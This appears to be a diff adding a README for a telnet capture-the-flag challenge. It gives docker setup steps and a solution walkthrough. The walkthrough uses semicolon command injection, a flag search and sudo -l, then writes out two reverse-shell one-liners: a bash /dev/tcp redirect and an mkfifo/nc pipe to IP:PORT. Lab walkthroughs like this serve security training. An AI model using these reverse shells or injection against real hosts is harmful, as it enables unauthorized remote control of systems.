@@ -1,0 +1,20 @@
+####### CHALLENGE TELENT ##########
+
+----- SETUP -----
+
+»│ Change 172.24.240.33:23 to relevent IP:OUTSIDE_PORT (keep 7777)
+»│ docker-compose build
+»│ docker-compose up
+
+---- SOLUTION ----
+
+1. nmap scan to find open telnet port
+2. connect to telnet port 		     (telnet IP PORT)
+3. run shell command with --> 		     (;command) 
+4. find flag --> 			     (;find / -name "*flag*")
+6. see who what user owns that file -->      (;ls -la)
+8. see they can run /bin/bash as phillip --> (;sudo -l)
+9. create reverse shell
+	- ; bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" 
+	- ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f
+10. cat /etc/flag.enc
